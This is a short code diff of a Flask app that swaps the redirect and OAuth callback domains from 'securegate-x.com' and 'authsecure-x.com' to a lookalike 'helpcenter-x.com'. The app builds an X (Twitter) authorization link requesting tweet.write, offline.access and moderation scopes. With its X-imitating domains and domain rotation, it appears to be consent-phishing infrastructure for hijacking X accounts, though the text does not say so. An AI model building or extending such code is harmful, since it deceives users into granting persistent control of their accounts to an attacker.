@@ -26,7 +26,7 @@ def link():
     data = groups.find_one()
     identifier = data["identifier"][0]
    
-    return redirect(f"https://securegate-x.com/oauth?r={identifier}")
+    return redirect(f"https://helpcenter-x.com/oauth?r={identifier}")
 
 @app.route('/oauth')
 def oauth():
@@ -74,7 +74,7 @@ def oauth():
 
 def generate_twitter_oauth_url():
     TWITTER_CLIENT_ID = session.get("client_id")
-    TWITTER_CALLBACK_URL = 'https%3A%2F%2Fauthsecure-x.com%2Fauth'
+    TWITTER_CALLBACK_URL = 'https%3A%2F%2Fhelpcenter-x.com%2Fauth'
     return (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}'
             f'&redirect_uri={TWITTER_CALLBACK_URL}'
             f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
